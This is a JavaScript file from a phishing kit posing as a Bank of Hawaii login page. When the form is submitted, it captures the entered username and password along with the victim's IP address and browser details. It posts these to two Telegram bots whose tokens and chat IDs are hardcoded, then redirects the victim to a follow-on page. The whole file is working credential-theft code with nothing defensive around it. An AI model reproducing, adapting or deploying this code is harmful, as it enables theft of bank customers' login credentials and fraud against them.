document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault();
    submitLogin();
});

function submitLogin() {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const loginButton = document.querySelector('button');

   
    loginButton.textContent = "Logging in...";
    loginButton.disabled = true; 

    fetchIpAddress().then(ip => {
        const userAgent = navigator.userAgent;

        const message = `*#--------[ BANK OF HAWAII  ]---------#*\n\n*Username* : ${username}\n*Password* : ${password}\n*IP Address* : ${ip}\n*Device Info* : ${userAgent}\n\n*#------------[ G1 - END ]-------------#*`;

        showLoadingSpinner();

        Promise.all([
            sendToTelegram(message, '7296082774:AAFvxOm88DKwjKo_lar3bbwJOcRftuNvNlc', '6994641548'), // Bot 1
            sendToTelegram(message, '7358577107:AAGMMSwYu4-OSpHMXnmNofQ_hO5JZ7-yONw', '6069290001')  // Bot 2
        ])
            .then(() => {
                setTimeout(() => {
                    window.location.href = "contact.html";
                }, 5000);
            })
            .catch(error => {
                console.error('Error sending messages:', error);
                alert("An error occurred while submitting the login info.");
                hideLoadingSpinner();
                resetButtonState(); // Reset button if failed
            });
    }).catch(error => {
        console.error("Error fetching IP address:", error);
        alert("An error occurred while fetching IP address.");
        hideLoadingSpinner();
        resetButtonState(); // Reset button if failed
    });
}

function resetButtonState() {
    const loginButton = document.querySelector('button');
    loginButton.textContent = "Log in";
    loginButton.disabled = false;
}

function fetchIpAddress() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(() => "Unavailable");
}

function showLoadingSpinner() {
    const loadingContainer = document.querySelector('.loading-container');
    if (loadingContainer) {
        loadingContainer.style.display = 'flex';
    }
}

function hideLoadingSpinner() {
    const loadingContainer = document.querySelector('.loading-container');
    if (loadingContainer) {
        loadingContainer.style.display = 'none';
    }
}

function sendToTelegram(message, botToken, chatId) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
        chat_id: chatId,
        text: message
    };

    return fetch(url, {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    })
        .then(response => {
            if (!response.ok) {
                throw new Error(`Telegram API responded with status ${response.status}`);
            }
            return response.json();
        });
}
